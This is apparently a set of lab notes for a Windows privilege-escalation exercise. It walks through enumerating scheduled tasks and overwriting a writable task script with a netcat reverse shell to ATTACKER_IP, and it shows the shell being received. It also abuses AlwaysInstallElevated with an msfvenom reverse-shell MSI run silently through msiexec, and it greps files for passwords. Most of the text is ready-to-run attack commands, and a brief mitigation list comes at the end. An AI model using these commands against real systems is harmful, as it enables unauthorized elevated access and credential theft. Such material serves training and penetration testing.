# Windows Scheduled Tasks Exploitation

Scheduled tasks in Windows can create privilege escalation opportunities when misconfigured. This document covers methods to identify and exploit vulnerable scheduled tasks.

## Identifying Scheduled Tasks

List all scheduled tasks with various commands:

```cmd
# Basic listing of all scheduled tasks
schtasks

# List tasks with more details in a readable format
schtasks /query /fo LIST

# Query a specific task with verbose output
schtasks /query /tn <TASKNAME> /fo list /v

# Using PowerShell to get all scheduled tasks
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Format-Table TaskName,TaskPath,State
```

## Exploitable Conditions

Look for these vulnerabilities in scheduled tasks:

1. **Writable Target Binary** - If the task runs a binary that your user can modify
2. **Missing Binary** - If the task attempts to run a non-existent binary in a location you can write to
3. **Weak Permissions on Task Definition** - If you can modify the task itself

## Checking File Permissions

When you identify a potential target task, check file permissions on the binary it runs:

```cmd
# Check permissions on the executable used by a scheduled task
icacls "C:\path\to\executable.exe"

# Look for (F) Full control or (M) Modify permissions for your user or groups you belong to
# Pay attention to these common groups: BUILTIN\Users, Everyone, Authenticated Users
```

Permissions flags to look for:

- `(F)` - Full control
- `(M)` - Modify
- `(W)` - Write
- `(I)` - Permission inherited from parent container

## Exploiting Writable Target Binaries

If you find a scheduled task runs a binary that you can modify:

```cmd
# For a .exe file, you'll need to replace it with your own malicious executable
# For a .bat or .ps1 file, you can simply modify the contents

# Example: Replacing a vulnerable BAT file with a reverse shell
echo C:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\vulnerable\path\task.bat

# Example: Adding commands to an existing script
echo C:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 >> C:\vulnerable\path\task.ps1
```

## Practical Example

This example shows how to exploit a vulnerable scheduled task:

1. **Identify the vulnerable task**:

```cmd
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```

2. **Check the file permissions**:

```cmd
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

3. **Replace the file with our payload**:

```cmd
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

4. **Set up a listener on the attacker machine**:

```bash
nc -lvp 4444
```

5. **Wait for the task to run or trigger it manually if you have permissions**:

```cmd
C:\> schtasks /run /tn vulntask
```

6. **Receive the reverse shell with taskusr1 privileges**:

```bash
user@attackerpc$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\taskusr1
```

## AlwaysInstallElevated Privilege Escalation

The Windows Installer service can be configured to run with elevated privileges for all users. This can be exploited to install a malicious MSI package with SYSTEM privileges.

### Checking Registry Settings

Both registry keys need to be set to 1 for this attack to work:

```cmd
# Check HKEY_CURRENT_USER
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Check HKEY_LOCAL_MACHINE
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Creating Malicious MSI

If both keys are set to 1, create a malicious MSI package on your attack machine:

```bash
# Generate malicious MSI with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

### Exploiting

Transfer the MSI to the target and execute it:

```cmd
# Execute the MSI silently
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

## Finding Files in Windows

To find files in Windows when searching for potential privilege escalation vectors:

```cmd
# Using dir command to search for files recursively
dir /s /b C:\filename.txt

# Search for files with specific extension
dir /s /b C:\*.bat

# Search in specific directory
dir /s /b C:\Windows\Tasks\*.bat

# Using PowerShell for more advanced searches
Get-ChildItem -Path C:\ -Include *.bat -File -Recurse -ErrorAction SilentlyContinue

# Find files containing specific text (like password)
findstr /si password *.txt *.ini *.config

# Find all dll files in the current directory and subdirectories
dir /s /b *.dll

# Find files modified in last 7 days
forfiles /P C:\ /S /M *.exe /D +7 /C "cmd /c echo @path"

# PowerShell search for recent files
Get-ChildItem -Path C:\ -Recurse -File | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-7)} 
```

## Protection and Mitigation

To protect systems from scheduled task vulnerabilities:

1. Ensure task binaries have appropriate permissions (limit to SYSTEM and Administrators)
2. Use absolute paths with quotes for task commands
3. Store task binaries in protected directories
4. Regularly audit scheduled tasks
5. Disable the AlwaysInstallElevated policy
6. Monitor for unexpected modifications to scheduled tasks

## Other Scheduled Task Exploitation Techniques

- Check for credentials in task arguments/parameters
- Look for scripts that access other writable files
- Inspect task actions for potential DLL hijacking
- Monitor file modifications to detect privilege escalation attempts 